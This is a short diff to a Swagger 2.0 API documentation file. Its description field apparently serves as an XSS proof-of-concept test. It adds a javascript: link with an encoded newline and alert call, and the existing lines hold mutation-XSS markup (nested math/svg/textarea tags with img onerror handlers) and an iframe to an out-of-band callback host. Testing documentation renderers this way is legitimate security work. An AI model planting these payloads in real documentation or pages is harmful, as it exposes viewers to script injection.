@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    This is a test :) [Documentat](https://www.google.com)
+    This is a test :) [Randomlink](javascript://www.google.com%0Aalert('URL'))
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
     <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
     <iframe src="https://wdmlfwehjkkbslnzvkyjczx1dchprmvw8.oast.fun"></iframe>
